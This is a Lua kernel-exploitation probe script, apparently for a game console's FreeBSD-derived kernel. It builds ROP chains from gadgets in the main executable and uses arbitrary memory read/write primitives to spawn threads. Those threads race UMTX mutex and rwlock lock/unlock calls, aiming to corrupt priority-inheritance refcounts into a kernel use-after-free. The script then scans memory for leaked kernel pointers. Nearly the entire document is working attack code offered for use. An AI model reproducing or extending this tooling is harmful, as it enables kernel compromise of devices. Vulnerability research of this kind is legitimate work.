-- CRASH_CLASS: HIGH
-- PROBE 160b: Threaded UMTX mutex race — PI refcount corruption
--
-- Context: op 5 (MUTEX_LOCK) writes TID, op 21 (NWAKE_PRIVATE) ret=0.
-- thr_create stable with ROP chain (83b v13: pop rdi/rsi/rax + syscall_addr).
-- Registers preserved across syscall (kernel trapframe save/restore),
-- so only need to reload RSI (op#) and RAX (454) between calls.
--
-- Attack: 2 child threads + main thread all contend on same PI mutex.
-- Children use ROP chain: LOCK(5) → UNLOCK(6) → repeat (~13K pairs per 1MB stack).
-- Main monitors mutex word, return values, process health.
--
-- Target: umtx_pi allocation/deallocation race in do_lock_pi/do_unlock_pi.
-- When lock and unlock race on PI mutex, umtx_pi refcount can corrupt:
-- - Thread A in do_lock_pi: umtx_pi_lookup → umtx_pi_ref
-- - Thread B in do_unlock_pi: umtx_pi_disown → potential free
-- - If B frees while A holds stale ref → UAF on umtx_pi (UMA zone)
--
-- Section A: Normal mutex race (flags=0)
-- Section B: PI mutex race (flags=UMUTEX_PRIO_INHERIT=0x4)
-- Section C: RW lock race (reader vs writer)

local TEST_SECTION = "B"

print("=== PROBE 160b: UMTX MUTEX RACE ===")
print("Section: " .. TEST_SECTION)
print("")

collectgarbage("stop")

-- ================================================================
-- Helpers
-- ================================================================
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function q(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X_%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function is_kptr(val)
    if val == nil then return false end
    local h, _ = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

-- Syscall constructors
local sc_umtx       = make_syscall(454)
local sc_thr_create = make_syscall(430)
local sc_thr_kill   = make_syscall(433)
local sc_mmap       = make_syscall(477)
local sc_624        = make_syscall(624)

-- thr_create context offsets (confirmed 14.10)
local C_RDI=0x048; local C_RSI=0x050; local C_RDX=0x058
local C_RCX=0x060; local C_R8=0x068;  local C_R9=0x070
local C_RAX=0x078; local C_CS=0x0C0;  local C_FLAGS=0x0D0
local C_RIP=0x0E0; local C_RSP=0x0F8; local C_SS=0x100
local C_MAGIC=0x108; local C_TYPE=0x110

local stub = syscall.pipe.fn_addr
local pid = to_num(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid)

local function canary()
    local ok = pcall(function() native.fcall_with_rax(stub, 20) end)
    return ok and "ALIVE" or "DEAD"
end

-- Resolve syscall_address (the raw `syscall; ret`)
local SA = syscall.syscall_address
if SA == nil then
    print("ERROR: no syscall_address")
    print("=== PROBE 160b ABORT ===")
    return
end
print("[0] syscall_address=" .. q(SA))

-- Resolve eboot base for gadgets
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = rd(info + 0x108) or 0
local eboot_hi = rd(info + 0x10C) or 0
if eboot_hi < 0 then eboot_hi = eboot_hi + 0x100000000 end
if eboot_lo < 0 then eboot_lo = eboot_lo + 0x100000000 end
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("[0] eboot_base=" .. q(eboot_base))

-- Gadgets (confirmed in eboot .text)
local POP_RDI = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + 0xC9DFE))
local POP_RSI = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + 0xD77D))
local POP_RAX = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + 0x992))
local RET_GAD = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + 0x42))

print("[0] gadgets: pop_rdi=" .. q(POP_RDI) .. " pop_rsi=" .. q(POP_RSI) ..
    " pop_rax=" .. q(POP_RAX))

-- ================================================================
-- Thread infrastructure
-- ================================================================
local STACK_SIZE = 0x200000  -- 2MB for ~26K lock/unlock pairs

local function build_umtx_stack(mutex_addr, op_lock, op_unlock)
    local ok_stk, stack = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then return nil end

    local mutex_val = uint64(to_num(mutex_addr))

    -- ROP chain pattern per lock/unlock pair:
    -- [pop_rsi] [op_unlock] [pop_rax] [454] [SA]   = UNLOCK (5 qwords)
    -- [pop_rsi] [op_lock]   [pop_rax] [454] [SA]   = LOCK   (5 qwords)
    -- Total: 10 qwords = 80 bytes per pair
    --
    -- Initial syscall (from context) does the first LOCK.
    -- Stack starts with UNLOCK to alternate properly.

    local off = 0
    local pair_size = 80  -- 10 * 8 bytes
    local max_pairs = math.floor(STACK_SIZE / pair_size) - 1

    for i = 1, max_pairs do
        -- UNLOCK
        wq(stack + off, POP_RSI);       off = off + 8
        wq(stack + off, uint64(op_unlock)); off = off + 8
        wq(stack + off, POP_RAX);       off = off + 8
        wq(stack + off, uint64(454));   off = off + 8
        wq(stack + off, SA);            off = off + 8
        -- LOCK
        wq(stack + off, POP_RSI);       off = off + 8
        wq(stack + off, uint64(op_lock)); off = off + 8
        wq(stack + off, POP_RAX);       off = off + 8
        wq(stack + off, uint64(454));   off = off + 8
        wq(stack + off, SA);            off = off + 8
    end

    -- Final: just a long nanosleep so the thread doesn't crash off the stack
    -- pop rdi → &timespec, pop rax → 240, syscall (nanosleep)
    local ts = memory.alloc(16)
    wq(ts, uint64(999))
    wq(ts + 8, uint64(0))
    wq(stack + off, POP_RDI);       off = off + 8
    wq(stack + off, uint64(to_num(ts))); off = off + 8
    wq(stack + off, POP_RSI);       off = off + 8
    wq(stack + off, uint64(0));     off = off + 8
    wq(stack + off, POP_RAX);       off = off + 8
    wq(stack + off, uint64(240));   off = off + 8
    wq(stack + off, SA);            off = off + 8

    print("  stack: " .. max_pairs .. " lock/unlock pairs, " .. off .. " bytes")
    return stack, max_pairs
end

local function build_rw_stack(rwlock_addr, op_a, op_unlock)
    local ok_stk, stack = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then return nil end

    local off = 0
    local pair_size = 80
    local max_pairs = math.floor(STACK_SIZE / pair_size) - 1

    for i = 1, max_pairs do
        -- UNLOCK
        wq(stack + off, POP_RSI);       off = off + 8
        wq(stack + off, uint64(op_unlock)); off = off + 8
        wq(stack + off, POP_RAX);       off = off + 8
        wq(stack + off, uint64(454));   off = off + 8
        wq(stack + off, SA);            off = off + 8
        -- LOCK (op_a)
        wq(stack + off, POP_RSI);       off = off + 8
        wq(stack + off, uint64(op_a));  off = off + 8
        wq(stack + off, POP_RAX);       off = off + 8
        wq(stack + off, uint64(454));   off = off + 8
        wq(stack + off, SA);            off = off + 8
    end

    -- Final nanosleep
    local ts = memory.alloc(16)
    wq(ts, uint64(999)); wq(ts + 8, uint64(0))
    wq(stack + off, POP_RDI); off = off + 8
    wq(stack + off, uint64(to_num(ts))); off = off + 8
    wq(stack + off, POP_RSI); off = off + 8
    wq(stack + off, uint64(0)); off = off + 8
    wq(stack + off, POP_RAX); off = off + 8
    wq(stack + off, uint64(240)); off = off + 8
    wq(stack + off, SA); off = off + 8

    print("  stack: " .. max_pairs .. " lock/unlock pairs")
    return stack, max_pairs
end

local function spawn_umtx_thread(stack_addr, mutex_addr, initial_op)
    local ctx = memory.alloc(0x200)
    zero(ctx, 0x200)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, uint64(0x10000))
    wq(ctx + C_CS, uint64(0x43))
    wq(ctx + C_SS, uint64(0x3B))
    wq(ctx + C_RIP, SA)
    wq(ctx + C_RSP, uint64(to_num(stack_addr)))
    wq(ctx + C_RAX, uint64(454))
    wq(ctx + C_RDI, uint64(to_num(mutex_addr)))
    wq(ctx + C_RSI, uint64(initial_op))
    wq(ctx + C_RDX, uint64(0))
    wq(ctx + C_RCX, uint64(0))
    wq(ctx + C_R8, uint64(0))
    wq(ctx + C_R9, uint64(0))

    local tid_buf = memory.alloc(8)
    wq(tid_buf, uint64(0))
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local tid = rq(tid_buf)
    return ok_tc, rv_tc, tid
end

local function thread_alive(tid)
    if tid == nil or to_num(tid) == 0 then return false end
    local ok, rv = pcall(function() return sc_thr_kill(tid, uint64(0)) end)
    return ok and to_num(rv) == 0
end

local function nanosleep_ms(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(math.floor(ms / 1000)))
    wq(ts + 8, uint64((ms % 1000) * 1000000))
    pcall(function()
        local sc_ns = make_syscall(240)
        sc_ns(uint64(ts), uint64(0))
    end)
end

local function vm_counter()
    local ok, cnt = pcall(function() return sc_624(uint64(0), uint64(0), uint64(0)) end)
    if ok then return to_num(cnt) end
    return -1
end

-- ================================================================
-- Preflight: verify MUTEX_LOCK(5) + MUTEX_UNLOCK(6) round trip
-- ================================================================
print("")
print("--- PREFLIGHT: LOCK/UNLOCK ROUND TRIP ---")

local pre_mtx = memory.alloc(0x40)
zero(pre_mtx, 0x40)
local ok_pl, r_pl = pcall(function()
    return sc_umtx(uint64(to_num(pre_mtx)), uint64(5), uint64(0), uint64(0), uint64(0))
end)
local pre_owner = rd(pre_mtx)
print("LOCK(5): ret=" .. (ok_pl and tostring(to_num(r_pl)) or "CRASH") ..
    " m_owner=0x" .. string.format("%08X", pre_owner or 0))

if not ok_pl or to_num(r_pl) ~= 0 then
    print("ERROR: MUTEX_LOCK failed — cannot race")
    print("=== PROBE 160b ABORT ===")
    return
end

local ok_pu, r_pu = pcall(function()
    return sc_umtx(uint64(to_num(pre_mtx)), uint64(6), uint64(0), uint64(0), uint64(0))
end)
local pre_owner2 = rd(pre_mtx)
print("UNLOCK(6): ret=" .. (ok_pu and tostring(to_num(r_pu)) or "CRASH") ..
    " m_owner=0x" .. string.format("%08X", pre_owner2 or 0))

if not ok_pu or to_num(r_pu) ~= 0 then
    print("WARNING: MUTEX_UNLOCK returned " .. (ok_pu and tostring(to_num(r_pu)) or "CRASH"))
    print("Continuing anyway — unlock failure might still produce interesting races")
end

local my_tid = pre_owner
print("my_tid=0x" .. string.format("%X", my_tid or 0))

-- ================================================================
-- SECTION A: Normal mutex race (m_flags=0)
-- ================================================================
if TEST_SECTION == "A" then
    print("")
    print("--- SECTION A: NORMAL MUTEX RACE ---")

    local mtx = memory.alloc(0x40)
    zero(mtx, 0x40)  -- m_owner=0, m_flags=0

    local vm_before = vm_counter()
    print("vm_counter_before=" .. vm_before)

    -- Build stacks for 2 children
    print("[A1] Building child 1 stack...")
    local stack1, pairs1 = build_umtx_stack(mtx, 5, 6)
    if not stack1 then print("ERROR: stack1 alloc failed"); return end

    print("[A2] Building child 2 stack...")
    local stack2, pairs2 = build_umtx_stack(mtx, 5, 6)
    if not stack2 then print("ERROR: stack2 alloc failed"); return end

    -- Spawn children
    print("[A3] Spawning child 1...")
    local ok1, rv1, tid1 = spawn_umtx_thread(stack1, mtx, 5)
    print("  rv=" .. (ok1 and tostring(to_num(rv1)) or "CRASH") .. " tid=" .. q(tid1))

    nanosleep_ms(5)

    print("[A4] Spawning child 2...")
    local ok2, rv2, tid2 = spawn_umtx_thread(stack2, mtx, 5)
    print("  rv=" .. (ok2 and tostring(to_num(rv2)) or "CRASH") .. " tid=" .. q(tid2))

    nanosleep_ms(5)
    print("  child1_alive=" .. tostring(thread_alive(tid1)))
    print("  child2_alive=" .. tostring(thread_alive(tid2)))

    -- Main thread: monitor mutex word while children race
    print("[A5] Monitoring race (200 samples, 5ms apart)...")
    local anomalies = 0
    local last_owner = 0

    for i = 1, 200 do
        local owner = rd(mtx) or 0
        local flags = rd(mtx + 4) or 0

        -- Check for anomalies
        local tid1_val = to_num(tid1)
        local tid2_val = to_num(tid2)
        local is_valid = (owner == 0) or
            (owner == tid1_val) or (owner == tid2_val) or
            (owner == (tid1_val + 0x80000000)) or  -- CONTESTED bit
            (owner == (tid2_val + 0x80000000))

        if not is_valid and owner ~= last_owner then
            anomalies = anomalies + 1
            print(string.format("  *** ANOMALY #%d @ sample %d: owner=0x%08X flags=0x%X",
                anomalies, i, owner, flags))
        end
        last_owner = owner

        if i % 50 == 0 then
            print(string.format("  sample %d: owner=0x%08X flags=0x%X alive=%s/%s",
                i, owner, flags,
                tostring(thread_alive(tid1)), tostring(thread_alive(tid2))))
        end

        nanosleep_ms(5)
    end

    local vm_after = vm_counter()
    print("[A6] vm_counter_after=" .. vm_after .. " delta=" .. (vm_after - vm_before))
    print("  anomalies=" .. anomalies)
    print("  canary=" .. canary())

-- ================================================================
-- SECTION B: PI mutex race (m_flags=UMUTEX_PRIO_INHERIT=0x4)
-- ================================================================
elseif TEST_SECTION == "B" then
    print("")
    print("--- SECTION B: PI MUTEX RACE ---")

    -- PI preflight: verify PI lock works
    print("[B0] PI preflight...")
    local pi_test = memory.alloc(0x40)
    zero(pi_test, 0x40)
    wd(pi_test + 4, 4)  -- UMUTEX_PRIO_INHERIT
    local ok_pit, r_pit = pcall(function()
        return sc_umtx(uint64(to_num(pi_test)), uint64(5), uint64(0), uint64(0), uint64(0))
    end)
    local pi_owner = rd(pi_test)
    print("  PI LOCK: ret=" .. (ok_pit and tostring(to_num(r_pit)) or "CRASH") ..
        " owner=0x" .. string.format("%08X", pi_owner or 0))

    if not ok_pit or to_num(r_pit) ~= 0 then
        print("ERROR: PI MUTEX_LOCK not available — falling back to normal")
        print("=== PROBE 160b ABORT ===")
        return
    end

    pcall(function() sc_umtx(uint64(to_num(pi_test)), uint64(6), uint64(0), uint64(0), uint64(0)) end)
    local pi_after = rd(pi_test)
    print("  PI UNLOCK: owner=0x" .. string.format("%08X", pi_after or 0))

    -- Race mutex with PI flag
    local mtx = memory.alloc(0x40)
    zero(mtx, 0x40)
    wd(mtx + 4, 4)  -- UMUTEX_PRIO_INHERIT

    local vm_before = vm_counter()
    print("vm_counter_before=" .. vm_before)

    print("[B1] Building child 1 stack...")
    local stack1, pairs1 = build_umtx_stack(mtx, 5, 6)
    if not stack1 then print("ERROR: stack1 alloc failed"); return end

    print("[B2] Building child 2 stack...")
    local stack2, pairs2 = build_umtx_stack(mtx, 5, 6)
    if not stack2 then print("ERROR: stack2 alloc failed"); return end

    print("[B3] Spawning child 1 (LOCK first)...")
    local ok1, rv1, tid1 = spawn_umtx_thread(stack1, mtx, 5)
    print("  rv=" .. (ok1 and tostring(to_num(rv1)) or "CRASH") .. " tid=" .. q(tid1))

    nanosleep_ms(5)

    print("[B4] Spawning child 2 (LOCK first)...")
    local ok2, rv2, tid2 = spawn_umtx_thread(stack2, mtx, 5)
    print("  rv=" .. (ok2 and tostring(to_num(rv2)) or "CRASH") .. " tid=" .. q(tid2))

    nanosleep_ms(10)
    print("  child1_alive=" .. tostring(thread_alive(tid1)))
    print("  child2_alive=" .. tostring(thread_alive(tid2)))

    -- Main thread also participates in the race
    print("[B5] Main thread racing + monitoring (500 rounds)...")
    local anomalies = 0
    local lock_ok = 0
    local lock_fail = 0
    local kptr_found = 0

    for i = 1, 500 do
        -- Main thread: try lock
        local ok_l, rv_l = pcall(function()
            return sc_umtx(uint64(to_num(mtx)), uint64(5), uint64(0), uint64(0), uint64(0))
        end)

        if ok_l and to_num(rv_l) == 0 then
            lock_ok = lock_ok + 1
            -- Got the lock — read mutex state
            local owner = rd(mtx) or 0

            -- Unlock immediately to keep the race tight
            pcall(function()
                sc_umtx(uint64(to_num(mtx)), uint64(6), uint64(0), uint64(0), uint64(0))
            end)
        else
            lock_fail = lock_fail + 1
        end

        -- Periodic check
        if i % 100 == 0 then
            local owner = rd(mtx) or 0
            local flags = rd(mtx + 4) or 0
            local vm_now = vm_counter()

            -- Scan mutex neighborhood for kernel pointers
            local kptrs = 0
            for off = 0, 0x38, 8 do
                local v = rq(mtx + off)
                if v and is_kptr(v) then
                    kptrs = kptrs + 1
                    if kptrs <= 5 then
                        print(string.format("  *** KPTR +0x%02X: %s", off, q(v)))
                    end
                    kptr_found = kptr_found + 1
                end
            end

            print(string.format("  round %d: owner=0x%08X flags=0x%X vm=%d lock_ok=%d fail=%d alive=%s/%s",
                i, owner, flags, vm_now, lock_ok, lock_fail,
                tostring(thread_alive(tid1)), tostring(thread_alive(tid2))))
        end
    end

    local vm_after = vm_counter()
    print("[B6] Results:")
    print("  vm_counter: before=" .. vm_before .. " after=" .. vm_after ..
        " delta=" .. (vm_after - vm_before))
    print("  main_thread: lock_ok=" .. lock_ok .. " lock_fail=" .. lock_fail)
    print("  anomalies=" .. anomalies .. " kptr_found=" .. kptr_found)

    -- Final mutex state
    print("[B7] Final mutex state:")
    for off = 0, 0x20, 4 do
        local v = rd(mtx + off) or 0
        if v ~= 0 or off <= 4 then
            print(string.format("  +0x%02X: 0x%08X", off, v))
        end
    end

    print("  canary=" .. canary())

-- ================================================================
-- SECTION C: RW lock race (reader vs writer)
-- ================================================================
elseif TEST_SECTION == "C" then
    print("")
    print("--- SECTION C: RW LOCK RACE ---")

    -- struct urwlock { int32_t rw_state; uint32_t rw_flags; uint32_t rw_blocked_readers;
    --                  uint32_t rw_blocked_writers; uint32_t rw_spare[4]; }
    local rwl = memory.alloc(0x40)
    zero(rwl, 0x40)

    local vm_before = vm_counter()
    print("vm_counter_before=" .. vm_before)

    -- Child 1: RW_RDLOCK(12) → RW_UNLOCK(14) loop
    print("[C1] Building reader stack...")
    local stack_rd, pairs_rd = build_rw_stack(rwl, 12, 14)
    if not stack_rd then print("ERROR: reader stack failed"); return end

    -- Child 2: RW_WRLOCK(13) → RW_UNLOCK(14) loop
    print("[C2] Building writer stack...")
    local stack_wr, pairs_wr = build_rw_stack(rwl, 13, 14)
    if not stack_wr then print("ERROR: writer stack failed"); return end

    print("[C3] Spawning reader child...")
    local ok_r, rv_r, tid_r = spawn_umtx_thread(stack_rd, rwl, 12)
    print("  rv=" .. (ok_r and tostring(to_num(rv_r)) or "CRASH") .. " tid=" .. q(tid_r))

    nanosleep_ms(5)

    print("[C4] Spawning writer child...")
    local ok_w, rv_w, tid_w = spawn_umtx_thread(stack_wr, rwl, 13)
    print("  rv=" .. (ok_w and tostring(to_num(rv_w)) or "CRASH") .. " tid=" .. q(tid_w))

    nanosleep_ms(10)
    print("  reader_alive=" .. tostring(thread_alive(tid_r)))
    print("  writer_alive=" .. tostring(thread_alive(tid_w)))

    -- Monitor
    print("[C5] Monitoring rwlock race (200 samples)...")
    local anomalies = 0

    for i = 1, 200 do
        local state = rd(rwl) or 0
        local flags = rd(rwl + 4) or 0
        local blocked_rd = rd(rwl + 8) or 0
        local blocked_wr = rd(rwl + 12) or 0

        if i % 50 == 0 then
            print(string.format(
                "  sample %d: state=0x%08X flags=0x%X blk_rd=%d blk_wr=%d alive=%s/%s",
                i, state, flags, blocked_rd, blocked_wr,
                tostring(thread_alive(tid_r)), tostring(thread_alive(tid_w))))
        end

        -- Anomaly: blocked counts should be 0 or small
        if blocked_rd > 100 or blocked_wr > 100 then
            anomalies = anomalies + 1
            if anomalies <= 10 then
                print(string.format("  *** ANOMALY: blk_rd=%d blk_wr=%d", blocked_rd, blocked_wr))
            end
        end

        nanosleep_ms(5)
    end

    local vm_after = vm_counter()
    print("[C6] Results:")
    print("  vm_counter: before=" .. vm_before .. " after=" .. vm_after ..
        " delta=" .. (vm_after - vm_before))
    print("  anomalies=" .. anomalies)

    -- Final rwlock state dump
    print("[C7] Final rwlock state:")
    for off = 0, 0x1C, 4 do
        print(string.format("  +0x%02X: 0x%08X", off, rd(rwl + off) or 0))
    end

    print("  canary=" .. canary())
end

print("")
print("=== PROBE 160b COMPLETE ===")
